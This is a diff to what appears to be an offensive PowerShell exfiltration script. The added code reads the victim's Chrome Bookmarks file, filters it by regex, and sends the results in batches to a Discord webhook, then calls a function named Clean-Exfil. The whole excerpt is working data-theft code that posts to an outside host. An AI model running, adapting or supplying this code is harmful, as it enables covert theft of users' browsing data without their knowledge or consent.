@@ -139,8 +139,6 @@ $Value | ForEach-Object {
 		$array.Add($_)
 		New-Object -TypeName PSObject -Property @{
 			User = $env:UserName
-			Browser = $Browser
-			DataType = $DataType
 			Data = $_
 		}
 		if ($counter -eq 50){
@@ -154,6 +152,36 @@ $Value | ForEach-Object {
 	
 }
 
-Discord-Upload -text $array -hook $link
+
+
+Upload-Discord -text $array -hook $link
+
+$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+$array = New-Object Collections.Generic.List[String]
+$counter = 0
+Upload-Discord -text "Bookmarks" -hook $link
+$Value | ForEach-Object {
+	$counter += 1
+	$Key = $_
+	if ($Key -match $Search){
+		$array.Add($_)
+		New-Object -TypeName PSObject -Property @{
+			User = $env:UserName
+			Data = $_
+		}
+		if ($counter -eq 50){
+			$counter = 0
+			Upload-Discord -text $array -hook $link
+			$array = New-Object Collections.Generic.List[String]
+		}
+		
+	
+	}
+	
+}
+
+Upload-Discord -text $array -hook $link
 
 Clean-Exfil
+
